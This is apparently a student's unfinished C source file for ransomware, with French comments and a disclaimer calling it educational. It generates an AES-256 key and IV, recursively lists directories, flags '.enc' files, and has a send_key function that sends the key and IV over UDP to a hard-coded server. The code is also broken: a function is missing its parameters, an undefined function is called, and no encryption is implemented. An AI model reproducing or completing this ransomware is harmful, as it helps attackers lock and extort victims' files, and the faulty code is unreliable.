#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[]){

	unsigned char key[AES_256_KEY_SIZE];
	int sizeKey = AES_256_KEY_SIZE;
	unsigned char iv[AES_BLOCK_SIZE];
	int sizeIv = AES_BLOCK_SIZE;
	char *pKey = (char*)malloc(2 * sizeof(key) + 1); /*tu fais en fonction de la taille de la clé*/
	char *pIv = (char*)malloc(2 * sizeof (key) + 1);

	
	generate_key(key,sizeKey,iv,sizeIv,pKey,pIv);
	printf("Voici pKey : %s\n",pKey);
	printf("Voici pIV : %s\n",pIv);
	show_dir_content(argv[1]);

	if (strcmp(argv[1],"-help")==0){
		usage();
	}

	
}


void usage(){
	
	printf("Ce programme a une vocation purement éducative! \n");
};

int is_encrypted{

	char *extension = strchr(filename, '.');
    char to_compare[]=".enc";

    if(strchr(filename,'.')== NULL){
    
        return 0;
    }
    else{
        if(strcmp(extension,to_compare)==0){
            return 1;
        }

        else{
            return 0;
        }
    }

};

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag){
    DIR *d = opendir(name);
    if (d == NULL)
    {
        perror("Erreur : ");
    }
    struct dirent *directory;
    while ((directory = readdir(d)) != NULL)
    {
        if (directory -> d_type != DT_DIR)
        {
            printf(" %s is not a directory\n",directory ->d_name);  
        }
        
        else
        if (directory -> d_type == DT_DIR && strcmp(directory ->d_name,".") != 0 && strcmp(directory ->d_name,"..") != 0)
        {
            char new_path[1000];
            sprintf(new_path, "%s/%s", name, directory ->d_name); /*comme un strcat car on utilise un buffer temporaire new_path pour créer le nouveau path*/
            printf("\n%s\n", new_path);
            printf("%s is a directory\n",directory ->d_name);
            show_dir_content(new_path);
        }
    }
    closedir(d);
};

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv){
    RAND_bytes(key, sizeKey); 
    RAND_bytes(iv, sizeIv);
    bytes_to_hexa(key, pKey, sizeKey);
	bytes_to_hexa(iv, pIv, sizeIv);
};

int send_key(char *pKey, char *pIv){
	int sockid;
    int server_port = 43000;
    char *server_ip = "172.24.10.100";

    sockid = socket(AF_INET,SOCK_DGRAM,0);

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    server_addr.sin_addr.s_addr = inet_addr(server_ip);

    sendto(sockid,(const char * )pKey,strlen(pKey),
            0,(const struct sockaddr*) &server_addr,sizeof(server_addr));

	sendto(sockid,(const char * )pIv,strlen(pIv),
            0,(const struct sockaddr*) &server_addr,sizeof(server_addr));
    
    
    close(sockid);
}